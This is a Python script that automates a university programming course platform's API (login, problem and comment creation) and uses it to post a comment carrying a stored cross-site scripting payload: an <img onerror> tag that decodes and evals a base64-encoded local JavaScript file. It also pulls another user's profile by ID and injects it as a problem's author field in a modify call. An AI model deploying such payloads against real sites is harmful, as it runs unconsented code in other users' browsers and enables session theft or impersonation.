import requests
import json
import base64
from pprint import pprint
DOMAIN = "https://pyshare.noj.tw"

def login(username:str, password:str)->requests.Session:
    url = f"{DOMAIN}/api/auth/session"
    sess = requests.session()
    with sess.post(url, json={
        "password":password,
        "school":"NTNU",
        "username":username
    }) as resp:
        if resp.status_code != 200:
            return None
    return sess

def create_problem(
    sess:requests.Session,
    title:str,
    description:str,
    course_id:str):
    url = f"{DOMAIN}/api/problem"
    with sess.post(url, json={
        "title":title,
        "description":description,
        "tags":[],
        "status":1,
        "attachments":[],
        "defaultCode":"",
        "isTemplate":False,
        "allowMultipleComments":True,
        "course":course_id
    }) as resp:
        if resp.status_code == 200:
            return json.loads(resp.text)['data']['pid']
    return -1

def create_comment(
    sess:requests.Session,
    pid:int,
    title:str,
    content:str,
    code = "print('a')"
    ):
    url = f"{DOMAIN}/api/comment"
    with sess.post(url, json={
        "target": "problem", 
        "id": pid, 
        "title": title, 
        "content": content, 
        "code": code
    }) as resp:
        if resp.status_code == 200:
            return resp.json()["data"]["id"]
        print(resp.text)
    return None
def delete_comment(
    sess:requests.Session,
    comment_id:str
):
    url = f"{DOMAIN}/api/comment/{comment_id}"
    with sess.delete(url) as resp:
        if resp.status_code != 200:
            raise Exception(f"unable to delete comment {resp.text}")
def create_attachment(
    sess:requests.Session,
    pid:str,
    file:str
):
    url = f"{DOMAIN}/api/problem/{pid}/attachment"
    with sess.post(url, files={
        "attachment":open(file, "rb"),
    },
    data={
        "attachmentName":file
    }) as resp:
        print(resp.text)

def modify_problem(
    sess:requests.Session,
    pid:int,
    course_id:str,
    user_object:dict,
    code = "i am default code",
    description = "<p>description</p>",
    title = "i am default title"
):
    url = f"{DOMAIN}/api/problem/{pid}"
    req_data = {
        "acceptance":2,
        "allowMultipleComments":True,
        "attachments":[],
        "author":user_object,
        "comments":[],
        "course":course_id,
        "defaultCode":code,
        "description":description,
        "extra":{
            "_cls":"NormalProblem"
        },
        "isTemplate":False,
        "pid":pid,
        "reference_count":0,
        "status":1,
        "tags":[],
        "timestamp":48763,
        "title":title
    }
    
    with sess.put(url, json=req_data) as resp:
        if resp.status_code != 200:
            raise Exception(f"response with {resp.text}")
        print(resp.text)
        # {filename: "execise-bot.jpg", source: "None", version_number: -1}
        print(f"attachments:{req_data['attachments']}")

def get_user_info(
    sess:requests.Session,
    user_id:str
)->dict:
    url = f"{DOMAIN}/api/user/{user_id}"
    with sess.get(url) as resp:
        if resp.status_code != 200:
            raise Exception(f"response with {resp.text}")
        return resp.json()['data']

def delete_attachments(
    sess:requests.Session,
    pid:int,
    attachment_name:str
):
    url = f"{DOMAIN}/api/problem/{pid}/attachment"
    with sess.delete(url, data={
        "attachmentName":attachment_name
    }) as resp:
        if resp.status_code != 200:
            raise Exception(f"return text:{resp.text}")

def get_course_info(
    sess:requests.Session,
)->dict:
    url = f"{DOMAIN}/api/course"
    with sess.get(url) as resp:
        if resp.status_code != 200:
            raise Exception(f"return text:{resp.text}")
        return resp.json()["data"]

def get_course_id(
    sess:requests.Session,
    course_name:str
)->str:
    for course_data in get_course_info(sess):
        if course_data["name"] == course_name:
            return course_data["id"]
    raise ValueError(f"can not find course {course_name}")

def get_problem_info(
    sess:requests.Session,
    course_id:str
)->dict:
    url = f"{DOMAIN}/api/problem?offset=0&count=-1&course={course_id}"
    with sess.get(url) as resp:
        if resp.status_code != 200:
            raise Exception(f"return text:{resp.text}")
        return resp.json()["data"]

def get_problem_id(
    sess:requests.Session,
    course_id:str,
    title:str
)->int:
    '''
    Note: this find the first occurance of title, there may be duplicated items.
    '''
    for prob in get_problem_info(sess, course_id):
        if prob["title"] == title:
            return prob["pid"]
    raise ValueError(f"can not find problem with title {title}")

def get_detailed_problem(
    sess:requests.Session,
    course_id:str,
    pid:int
)->dict:
    for prob in get_problem_info(sess, course_id):
        if prob["pid"] == pid:
            return prob
    raise ValueError(f"can not find problem with pid {pid}")

def main():
    cred = json.loads(open("cred.json", "r").read())
    sess = login(cred["username"], cred["password"])
    user_id = "616764fed15ba0d786251762"
    
    course_name = "1101_運動數據分析與程式設計"
    title = "全師大最大線上LOL雷包分析系統上線了歐~~~(陳兆閔, 林昕鋭)"

    user_object = get_user_info(sess, user_id)
    course_id = get_course_id(sess, course_name)
    pid = get_problem_id(sess, course_id, title)
    '''
    modify_problem(
        sess,
        pid,
        course_id,
        user_object,
        "testcode",
        open("_index.html", "r", encoding="utf-8").read(),
        title
    )
    '''
    
    payload = base64.b64encode(open("embedded.js", 'r').read().encode()).decode()
    delete_comment(sess, "61d58b16a5ed96efbbb8aaf8")
    print(create_comment(sess, pid, "LOL雷包分析系統", f"<img src='' onerror='javascript:eval(atob(\"{payload}\"))'>"))

if __name__ == "__main__":
    main()
